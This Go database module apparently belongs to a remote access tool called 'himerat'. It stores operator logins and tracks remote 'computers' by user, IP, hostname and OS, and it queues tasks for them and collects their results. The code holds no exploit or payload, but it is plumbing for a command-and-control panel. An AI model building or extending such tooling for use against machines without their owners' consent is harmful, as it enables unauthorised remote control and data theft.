package db

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/bcrypt"

	"himerat/models"
)

var DB *sql.DB

func dbPath() string {
	if p := os.Getenv("DB_PATH"); p != "" {
		return p
	}
	return "../computers.db"
}

func InitDB() {
	var err error
	DB, err = sql.Open("sqlite3", dbPath())
	if err != nil {
		log.Fatal(err)
	}

	_, err = DB.Exec(`CREATE TABLE IF NOT EXISTS users (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		username TEXT UNIQUE,
		password TEXT
	)`)
	if err != nil {
		log.Fatal(err)
	}
}

func UserExists(userID int) (bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	var username string
	err := DB.QueryRowContext(ctx, "SELECT username FROM users WHERE id = ?", userID).Scan(&username)
	if err == sql.ErrNoRows {
		return false, nil
	}
	if err != nil {
		return false, err
	}
	return true, nil
}

func CreateUser(username, password string) error {
	hashed, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return err
	}
	_, err = DB.Exec("INSERT INTO users (username, password) VALUES (?, ?)", username, hashed)
	return err
}

func LoginUser(username, password string) (models.User, error) {
	var user models.User
	err := DB.QueryRow("SELECT id, username, password FROM users WHERE username = ?", username).
		Scan(&user.ID, &user.Username, &user.Password)
	if err == sql.ErrNoRows {
		return user, fmt.Errorf("user not found")
	}
	if err != nil {
		return user, err
	}
	if bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password)) != nil {
		return user, fmt.Errorf("invalid password")
	}
	return user, nil
}

func ListComputers() ([]models.Computer, error) {
	rows, err := DB.Query(`
		SELECT id, system_hash, pid, user, local_ip,
		       COALESCE(hostname,''), COALESCE(os_info,''), COALESCE(kernel,''),
		       COALESCE(status,1), COALESCE(last_seen,'')
		FROM computers ORDER BY id DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var list []models.Computer
	for rows.Next() {
		var c models.Computer
		if err := rows.Scan(&c.ID, &c.SystemHash, &c.PID, &c.User, &c.LocalIP,
			&c.Hostname, &c.OsInfo, &c.Kernel, &c.Status, &c.LastSeen); err != nil {
			return nil, err
		}
		list = append(list, c)
	}
	return list, rows.Err()
}

func GetComputer(id int) (models.Computer, error) {
	var c models.Computer
	err := DB.QueryRow(`
		SELECT id, system_hash, pid, user, local_ip,
		       COALESCE(hostname,''), COALESCE(os_info,''), COALESCE(kernel,''),
		       COALESCE(status,1), COALESCE(last_seen,'')
		FROM computers WHERE id = ?`, id).
		Scan(&c.ID, &c.SystemHash, &c.PID, &c.User, &c.LocalIP,
			&c.Hostname, &c.OsInfo, &c.Kernel, &c.Status, &c.LastSeen)
	return c, err
}

func EnqueueTask(computerID int, taskName string) (int64, error) {
	res, err := DB.Exec(
		`INSERT INTO tasks (computer_id, task_name, status, created_at) VALUES (?, ?, 'pending', datetime('now'))`,
		computerID, taskName,
	)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func ListResults(computerID int) ([]models.TaskResult, error) {
	rows, err := DB.Query(`
		SELECT id, COALESCE(task_id,0), task_name, result_json, COALESCE(created_at,'')
		FROM results WHERE computer_id = ? ORDER BY id DESC LIMIT 50`, computerID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []models.TaskResult
	for rows.Next() {
		var r models.TaskResult
		var raw string
		if err := rows.Scan(&r.ID, &r.TaskID, &r.TaskName, &raw, &r.CreatedAt); err != nil {
			return nil, err
		}
		_ = json.Unmarshal([]byte(raw), &r.Result)
		out = append(out, r)
	}
	return out, rows.Err()
}
